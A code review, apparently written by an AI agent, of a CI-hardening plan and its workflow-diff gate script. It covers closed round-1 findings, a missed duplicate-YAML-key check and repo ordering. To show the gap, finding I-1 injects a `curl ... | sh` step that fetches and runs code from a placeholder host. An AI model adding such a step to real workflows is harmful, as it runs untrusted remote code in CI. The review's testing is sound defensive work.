# CI-hardening plan review, round 2

Reviewed: `git diff e32c7df7..58cfbe13` (plan, rewritten gate, one FOLLOWUPS
entry) on branch `ci/hardening-2026-10-11`. Bases unchanged: toolkit
`origin/master` is still `4d703bb4`, engrave `origin/master` is still `21136827`.

**Verdict: 0 Critical / 2 Important / 3 Minor / 4 Nit**

What I ran: the self-test (`GATE_SCRATCH=/scratch/code/shibboleth/_work/r2-review`):
PASS, GREEN on the plan and RED on all 11 mutations, as claimed. I then made 8
more mutations against a plan-applied scratch tree (`_work/r2-review/tk`, built
with the gate's own `apply_plan_text`), and ran actionlint on each. I applied G
literally (`sed` below each `^    runs-on:` in gen.py at 21136827) and T to
scratch copies of the five generated `release.yml` files. `release-gen` on that
edited set gives 5/5 `identical`, GREEN. Round 1's check covered only the
unedited bases.

---

## Closure of round 1

| r1 | Status | Evidence |
|---|---|---|
| C1 | **Partly closed** | `expected()` + `same()` + the file-set and removed-lines checks close M1–M5, M7 and M8 (the self-test reproduces each one RED). **M6 (a duplicate key) is not closed**: the gate still reports GREEN on it, and it is not among the 11 mutations, although plan line 298–299 and the fold message say "r1's M1–M8". See I-1. |
| I1 | Closed | G (plan 252–272) is unambiguous: gen.py has exactly 3 `^    runs-on:` lines (128, 158, 225 at base). The inserted line has no braces, so the f-string is unaffected. G+T applied literally give byte-identical output for all five repos (above). The only CI consumer of gen.py is `scripts/check-minisign-pin.sh` (engrave `release.yml:96`), which reads the pubkey and is unaffected, so "nothing breaks in between" holds. `emit.py` does write to `/scratch/code/shibboleth/<repo>/` (emit.py:159), so the "do not run emit.py" warning is correct. Its prefix (lines 1–154) writes nothing. The `__pycache__/` that the gate's import creates in the engrave worktree is ignored (`.gitignore:40`). |
| I2 | Closed | Plan 54–62: the worktree and branch already exist, the other six repos get `worktree add`, and every change is a new commit, never amend. Plan 276–277: the worktree gate is the only copy, never copy it. Plan 329–331. |
| I3 | Closed | "or rustc" is gone (plan 37–40, K1 comment). The K1 and docbins installs run from the repo cwd with no toolchain override, so `rust-toolchain.toml` (1.85.0) governs them and hashing it is the right key. guibin sets `RUSTUP_TOOLCHAIN: stable` (manual-gui.yml:286), and its new comment says correctly that a new stable does not rebuild. |
| M-3 | Closed | The runner-images source sets `ImageOS` in `/etc/environment` (`images/ubuntu/scripts/build/configure-environment.sh:13`, from `IMAGE_OS`). The values are `ubuntu24` / `ubuntu26` (`templates/locals.ubuntu.pkr.hcl`; a `build.ubuntu-26_04.pkr.hcl` exists). That is the right discriminator for 24→26, since glibc is fixed per LTS. Ordering: the K1 PATH step (`id: sibling`) has the same guard as the restore and sits before it, so `steps.sibling.outputs.image` is always set when the restore runs. On tags, the restore and its post-save are skipped while the PATH step still runs, so installs go to `$RUNNER_TEMP/sibling-clis` and are found on PATH. All nine install steps carry the same guard (checked), and `command -v md` / `MD_BIN=md` resolve through PATH. The K3 `img` steps have no step `if:`, but they are bounded by the job-level `if:`; they cost one `echo`. No existing `id: sibling` or `id: img` exists. `${{ !startsWith(...) }}` parses, and actionlint is clean on the applied tree. |
| M-4 | Closed in text | Plan 152–156 decides it: insert above `      # ---- Real-bin output-fidelity gate`. The gate cannot see the difference (my mutation with K1 below the comment: gate GREEN, actionlint 0), and NOT COVERED does not say so. See M-B. |

---

## New findings

### I-1 — Important — the gate accepts duplicate mapping keys, and the plan says its self-test covers r1's M6 when it does not

**Location:** gate `load()` (lines 95–99, plain `yaml.safe_load`); `MUTATIONS`
(306–326); plan 297–299 ("RED on each of 11 known-bad mutations (review r1's
M1–M8 and three more)"); fold message ("r1's M1-M8 among them").

**Failure scenario (reproduced):** the 11 mutations are r1's M1, M2, M3, M4, M5,
M7 and M8 plus four new ones. M6 is absent. On the plan-applied tree:
- `run: curl -s https://example.invalid | sh` inserted directly above the K1 PATH step's `run: |` → **gate GREEN**.
- `run: echo PWNED` inserted above an existing base step's `run:` in rust.yml → **gate GREEN** (the removed-lines check does not fire, because nothing is removed).
- a second top-level `jobs:` appended to examples.yml, repeating the first → **gate GREEN**.

PyYAML keeps the last value, so the parsed tree equals the expected one.
actionlint flags all three (`key "run" is duplicated`), and GitHub would reject
the file, so the combined procedure catches it. But the gate's docstring ("proves
a workflow diff is EXACTLY the planned edits"), the plan and the fold commit all
claim coverage it does not have. That is a defect in what the tool claims.

**Fix:** load with a duplicate-rejecting loader, and add M6 to `MUTATIONS`:
```python
class _Unique(yaml.SafeLoader):
    pass
def _mapping(loader, node, deep=False):
    seen = set()
    for k, _ in node.value:
        key = repr(loader.construct_object(k, deep=deep))
        if key in seen:
            raise GateError(f"duplicate key {key} at line {k.start_mark.line + 1}")
        seen.add(key)
    return loader.construct_mapping(node, deep)
_Unique.add_constructor(yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _mapping)
# load(): y = yaml.load(text, Loader=_Unique); check_workflows catches GateError from both loads
```
Alternatively, M-A's added-lines whitelist closes this too.

### I-2 — Important — the repo order is undecided, and release-gen needs the engrave commit to come last

**Location:** plan 42–52 (table order: dm, tk, gui, mk, ms, **me**, mt); 274
("run before every commit that touches workflows"); 291 ("once the engrave and
the five generated repos are edited"); 345 ("in the engrave commit, also the
release-gen lines").

**Failure scenario:** an implementer working in table order reaches
mnemonic-engrave before mnemonic-transaction is edited. `release-gen` then
prints `mnemonic-transaction: DIFFERS` → RED. The cause is not "an edit you made
by mistake", so the stop rule (plan 366–367) says STOP and report. A second
implementer reorders on their own and does mt first. A third commits engrave
without the release-gen lines and runs it later. The result is three different
histories or a needless stop.

**Fix:** add one sentence: "Order: edit, gate and commit the six other repos
first; do mnemonic-engrave last, and run `release-gen` immediately before its
commit."

---

## Minor

- **M-A — YAML 1.1 spellings pass the gate.** `cancel-in-progress: yes` → gate GREEN (PyYAML reads True; actionlint does flag it). `timeout-minutes: 6_0` → gate GREEN **and** actionlint 0 (PyYAML reads int 60; GitHub's YAML 1.2 reads the string `6_0`). Plan 288–289 ("types included, so `1` is not `true`") reads broader than it is. A deliberate deviation is needed to hit this. Fix: also check `git diff`'s added lines. Every `+` line must be either an exact planned line (the T line, the X line, the C block lines, the K1/K3 step lines with `<FILE>` substituted, the two K2 env lines) or a comment or blank line. This also closes I-1.
- **M-B — position relative to existing comments, and key order, are not gated, and the plan does not say so.** Reproduced as gate GREEN and actionlint 0: K1 placed below technical-manual's `# ---- Real-bin` comment (the M-4 decision), K2 `env:` placed after `run:`, and the C block moved to the top of the file. Every one is semantically harmless. Plan 286–287 says "K at their exact positions" (true for step order only), and NOT COVERED (321–322) lists only wording, blank lines and quoting. Fix: append to NOT COVERED: "the position of added lines relative to existing comments, and key order inside a mapping (C above `jobs:`, `env:` above `run:`, K1 above the technical-manual section comment)."
- **M-C — release-gen does not bound the generator's own diff.** It rebuilds emit.py's loop call by hand (gate 239–240) instead of running emit.py's own loop, and it checks neither that `emit.py` is unchanged nor that gen.py gained exactly three lines. An edit to emit.py's loop, or an output-neutral edit to gen.py, goes unseen. Fix: give `release-gen` the engrave base ref and assert that `git diff --numstat <base> -- scripts/release-workflows` is exactly `3	0	scripts/release-workflows/gen.py`, with every `+` line equal to `    timeout-minutes: 60`.

## Nit

- **N-a:** in the commit template (341), "K: 10 cache/PATH steps" counts two steps that are neither (`Read runner image for the cache key`). Suggest "10 K steps (cache, PATH, image)".
- **N-b:** the non-toolkit PR title (352) is used for engrave too, which also changes `scripts/release-workflows/gen.py`. Suggest giving engrave a title that names the generator.
- **N-c:** line 23, "the slowest job ever seen", overstates the measured window (the last 100 successful rust.yml runs; the last 300 runs elsewhere). Suggest "the slowest job measured".
- **N-d:** for the technical-manual K1 insert, the plan does not say explicitly that a blank line follows the second inserted step, before the section comment. The gate cannot see it, though it shows in the diff.

---

**Fold accounting:** all 9 findings (2I/3M/4N) were introduced by fold commit
58cfbe13 (authored by Opus; effort not recorded in the commit). I-1's underlying
gap is r1's M6, which the fold left unclosed while claiming to have closed it.
The false claim is new.

Reproduction: `/tmp/claude-1000/-scratch-code-shibboleth/0ea7914a-eebe-4880-89b7-c21247ab7cc0/scratchpad/r2/mut.py`
(mutations plus actionlint); trees under `/scratch/code/shibboleth/_work/r2-review/`
(`tk/` is the plan-applied toolkit tree, `rg1/` holds the G+T-applied
generator and release.yml copies, and `selftest.out` is the self-test output).
